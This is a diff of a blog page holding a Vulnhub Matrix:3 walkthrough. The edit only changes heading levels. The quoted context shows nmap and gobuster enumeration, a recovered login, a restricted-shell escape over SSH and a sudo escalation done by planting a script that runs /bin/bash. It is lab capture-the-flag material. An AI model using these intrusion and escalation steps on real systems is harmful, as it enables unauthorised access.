@@ -54,11 +54,11 @@ Contact Me
 <div class="row justify-content-center">
 <div class=col-lg-8>
 <article class=site-blog-details>
-<p><span>September 26, 2020</span> by <span>Nasef</span></p>
 <h2 class=blog-title>Matrix:3 Vulnhub Walkthrough</h2>
+<p><span>September 26, 2020</span> by <span>Nasef</span></p>
 <img class=feature-image src=https://iamnasef.com/images/blog/featured-image-vulnhub.png alt=blog-feature-image>
 <p>Matrix:3 is a machine in which I used a combination of enumeration and reverse engineering to obtain shell access and then exploited the misconfigured sudo permissions to get root Access.</p>
-<h2 id=scanning>Scanning</h2>
+<h3 id=scanning>Scanning</h3>
 <p>As always, I started scanning with Nmap</p>
 <pre><code>root@kali:/home/kali# nmap -sC -sV -p- 192.168.198.140
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 18:34 EDT
@@ -84,7 +84,7 @@ MAC Address: 00:0C:29:84:C1:62 (VMware)
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                    
 Nmap done: 1 IP address (1 host up) scanned in 27.84 seconds  
 </code></pre><p>Interesting two http services!</p>
-<h2 id=web-enumeration>Web Enumeration</h2>
+<h3 id=web-enumeration>Web Enumeration</h3>
 <p>Then I enumerated directories and files using gobuster on the port 80 service and discovered directory called Matrix</p>
 <pre><code>oot@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 192.168.198.140 -x py,php,html,txt,json
 ===============================================================
@@ -182,7 +182,7 @@ Stream name: MZ� 4
 206 0x000025c0 0x004049c0  10  11 () ascii &quot;';i6$Jh5c
 
 </code></pre><p>I found a combination of &ldquo;guest:7R1n17yN30&rdquo; Immeditatly I used it to login via ssh</p>
-<h2 id=escalation-to-trinity>Escalation to Trinity</h2>
+<h3 id=escalation-to-trinity>Escalation to Trinity</h3>
 <p>When I sshed to the user guest, it gave me a restricted shell so I bypassed the restriction by using this command</p>
 <pre><code>ssh guest@192.168.198.140 -p 6464 -t bash
 
@@ -228,7 +228,7 @@ Warning: Permanently added '[192.168.198.140]:6464' (ECDSA) to the list of known
 Enter passphrase for key '/home/guest/.ssh/id_rsa': 
 bash-4.4$ id
 uid=1001(trinity) gid=1001(trinity) groups=1001(trinity)
-</code></pre><h2 id=escalation-to-root>Escalation to Root</h2>
+</code></pre><h3 id=escalation-to-root>Escalation to Root</h3>
 <p>Running sudo -l again, now we could execute a script called oracle as root. but when I cd to /home/trinity I didnt' find this script. so, I created a scirpt with a same name containing the word &ldquo;/bin/bash&rdquo;</p>
 <pre><code>sh-4.4$ sudo -l
 User trinity may run the following commands on matrix:
